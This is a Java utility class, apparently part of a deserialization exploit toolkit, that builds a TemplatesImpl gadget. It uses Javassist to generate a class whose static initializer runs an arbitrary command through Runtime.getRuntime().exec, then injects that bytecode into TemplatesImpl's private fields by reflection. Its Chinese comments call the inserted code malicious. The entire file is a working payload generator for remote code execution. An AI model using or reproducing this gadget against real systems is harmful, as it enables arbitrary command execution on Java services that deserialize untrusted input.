package org.util;


import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;

import java.lang.reflect.Field;
import java.util.UUID;

public class TemplateUtils {
    public static TemplatesImpl getTemplate(String common) throws Exception {
        //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
        UUID uuid = UUID.randomUUID();
        String replace = uuid.toString().replace("-", "");

        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass("a"+replace);
        String cmd = "Runtime.getRuntime().exec(\""+common+"\");";
        //向静态代码块插入恶意代码，插入到构造函数也可以
        cc.makeClassInitializer().insertBefore(cmd);
        //需设置此项才能实现newinstance，具体原因请看defineTransletClasses和getTransletInstance源码
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        cc.setName("A"+replace);
        byte[] evilbytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{evilbytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Class clazz = TemplatesImpl.class.newInstance().getClass();
        Field[] Fields = clazz.getDeclaredFields();
        for (Field Field : Fields) { //遍历Fields数组
            try {
                Field.setAccessible(true);  //对数组中的每一项实现私有访问
                if(Field.getName()=="_bytecodes"){
                    Field.set(templates,targetByteCodes);
                }
                if(Field.getName()=="_class"){
                    Field.set(templates,null);
                }
                if(Field.getName()=="_name"){
                    Field.set(templates,"abc");
                }
                if(Field.getName()=="_tfactory"){
                    Field.set(templates,new TemplatesImpl());
                }
            } catch (Exception e) {}
        }
        return templates;
    }
}
